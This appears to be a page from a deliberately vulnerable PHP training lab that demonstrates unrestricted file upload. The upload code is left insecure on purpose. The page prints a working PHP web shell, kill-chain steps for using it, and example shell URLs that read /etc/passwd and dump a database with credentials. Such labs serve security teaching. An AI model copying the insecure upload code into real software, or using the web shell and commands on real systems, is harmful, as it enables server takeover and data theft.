<?php
// VULNERABILITY: A08 - Software and Data Integrity Failures
// This file demonstrates unrestricted file upload vulnerabilities

$message = '';
$error = '';
$uploaded_files = [];

// VULNERABILITY: No file type validation or restrictions
if ($_FILES) {
    $upload_dir = 'uploads/';
    
    // Create upload directory if it doesn't exist
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0777, true);
    }
    
    foreach ($_FILES as $file) {
        if ($file['error'] === UPLOAD_ERR_OK) {
            $filename = $file['name'];
            $tmp_name = $file['tmp_name'];
            $size = $file['size'];
            
            // VULNERABILITY: No file type validation
            // VULNERABILITY: No file size limits
            // VULNERABILITY: No virus scanning
            // VULNERABILITY: No filename sanitization
            
            $target_path = $upload_dir . $filename;
            
            if (move_uploaded_file($tmp_name, $target_path)) {
                $uploaded_files[] = [
                    'name' => $filename,
                    'path' => $target_path,
                    'size' => $size,
                    'url' => 'http://' . $_SERVER['HTTP_HOST'] . '/' . $target_path
                ];
                $message = "File uploaded successfully!";
            } else {
                $error = "Failed to upload file: " . $filename;
            }
        } else {
            $error = "Upload error: " . $file['error'];
        }
    }
}

// List uploaded files
$upload_dir = 'uploads/';
$existing_files = [];
if (is_dir($upload_dir)) {
    $files = scandir($upload_dir);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $existing_files[] = [
                'name' => $file,
                'path' => $upload_dir . $file,
                'url' => 'http://' . $_SERVER['HTTP_HOST'] . '/' . $upload_dir . $file
            ];
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>W Corp - File Upload Demo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
            background-color: #2c3e50;
            color: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .nav {
            background-color: #34495e;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .nav a {
            color: white;
            text-decoration: none;
            margin-right: 20px;
            padding: 5px 10px;
            border-radius: 4px;
        }
        .nav a:hover {
            background-color: #2c3e50;
        }
        .alert {
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .alert-success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .alert-danger {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .alert-warning {
            background-color: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .btn {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover {
            background-color: #2980b9;
        }
        .btn-danger {
            background-color: #e74c3c;
        }
        .btn-danger:hover {
            background-color: #c0392b;
        }
        .file-list {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 4px;
            padding: 15px;
            margin: 10px 0;
        }
        .file-item {
            padding: 5px 0;
            border-bottom: 1px solid #dee2e6;
        }
        .file-item:last-child {
            border-bottom: none;
        }
        .code-block {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 4px;
            padding: 15px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>W Corp - File Upload Demo</h1>
            <p>Demonstrating A08: Software and Data Integrity Failures</p>
        </div>

        <div class="nav">
            <a href="index.php">Home</a>
            <a href="login.php">SQL Injection</a>
            <a href="upload.php">File Upload</a>
            <a href="info.php">PHP Info</a>
        </div>

        <div class="alert alert-warning">
            <strong>⚠️ Vulnerability:</strong> This file upload system has no restrictions on file types, 
            sizes, or content validation. Malicious files can be uploaded and executed.
        </div>

        <?php if ($message): ?>
            <div class="alert alert-success">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>

        <?php if ($error): ?>
            <div class="alert alert-danger">
                <?php echo htmlspecialchars($error); ?>
            </div>
        <?php endif; ?>

        <h2>File Upload Form</h2>
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group">
                <label for="file">Select File:</label>
                <input type="file" id="file" name="file" required>
            </div>
            <button type="submit" class="btn">Upload File</button>
        </form>

        <?php if (!empty($uploaded_files)): ?>
            <h3>Recently Uploaded Files</h3>
            <div class="file-list">
                <?php foreach ($uploaded_files as $file): ?>
                    <div class="file-item">
                        <strong><?php echo htmlspecialchars($file['name']); ?></strong><br>
                        Size: <?php echo $file['size']; ?> bytes<br>
                        <a href="<?php echo htmlspecialchars($file['url']); ?>" target="_blank">View File</a>
                    </div>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>

        <?php if (!empty($existing_files)): ?>
            <h3>All Uploaded Files</h3>
            <div class="file-list">
                <?php foreach ($existing_files as $file): ?>
                    <div class="file-item">
                        <strong><?php echo htmlspecialchars($file['name']); ?></strong><br>
                        <a href="<?php echo htmlspecialchars($file['url']); ?>" target="_blank">View File</a>
                    </div>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>

        <h3>Web Shell Example</h3>
        <p>Create a PHP web shell file named <code>shell.php</code> with the following content:</p>
        <div class="code-block">
            &lt;?php<br>
            if (isset($_GET['cmd'])) {<br>
            &nbsp;&nbsp;&nbsp;&nbsp;echo "&lt;pre&gt;";<br>
            &nbsp;&nbsp;&nbsp;&nbsp;system($_GET['cmd']);<br>
            &nbsp;&nbsp;&nbsp;&nbsp;echo "&lt;/pre&gt;";<br>
            }<br>
            ?&gt;
        </div>

        <h3>Cyber Kill Chain - File Upload Attack</h3>
        <ol>
            <li><strong>Reconnaissance:</strong> Identify the file upload vulnerability</li>
            <li><strong>Weaponization:</strong> Create a PHP web shell</li>
            <li><strong>Delivery:</strong> Upload the web shell through the vulnerable form</li>
            <li><strong>Exploitation:</strong> Access the uploaded web shell</li>
            <li><strong>Installation:</strong> Establish persistent access</li>
            <li><strong>Command & Control:</strong> Use web shell for remote commands</li>
            <li><strong>Actions on Objectives:</strong> Perform data exfiltration</li>
        </ol>

        <h3>Web Shell Usage</h3>
        <p>After uploading a web shell, access it with commands:</p>
        <div class="code-block">
            http://localhost:8080/uploads/shell.php?cmd=whoami<br>
            http://localhost:8080/uploads/shell.php?cmd=ls -la<br>
            http://localhost:8080/uploads/shell.php?cmd=cat /etc/passwd<br>
            http://localhost:8080/uploads/shell.php?cmd=mysqldump -u wcorp_user -pwcorp_pass wcorp_db
        </div>

        <h3>Vulnerable Code</h3>
        <div class="code-block">
            // VULNERABILITY: No file type validation<br>
            // VULNERABILITY: No file size limits<br>
            // VULNERABILITY: No virus scanning<br>
            // VULNERABILITY: No filename sanitization<br>
            $target_path = $upload_dir . $filename;<br>
            move_uploaded_file($tmp_name, $target_path);
        </div>

        <div class="alert alert-danger">
            <strong>🔴 Critical:</strong> This vulnerability allows attackers to:<br>
            • Upload malicious files (web shells, backdoors)<br>
            • Execute arbitrary code on the server<br>
            • Gain remote access to the system<br>
            • Perform data exfiltration<br>
            • Install persistent backdoors
        </div>
    </div>
</body>
</html>
